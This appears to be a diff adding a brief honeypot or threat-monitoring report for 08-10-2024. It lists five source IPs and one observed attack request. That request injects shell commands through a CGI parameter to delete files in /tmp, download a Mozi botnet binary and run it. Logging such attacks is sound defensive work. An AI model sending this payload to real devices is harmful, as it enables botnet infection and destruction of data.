@@ -1,0 +1,16 @@
+Top 5 IPs for 08-10-2024 :
+
+164.163.98.28
+117.50.187.153
+79.175.128.161
+69.14.212.110
+3.208.190.115
+
+Malware Observed:
+
+None
+
+Commands/exploits observed :
+
+
+GET /board.cgi?cmd=cd+/tmp;rm+-rf+*;wget+http://192.168.1.1:8088/Mozi.a;chmod+777+Mozi.a;/tmp/Mozi.a+varcron
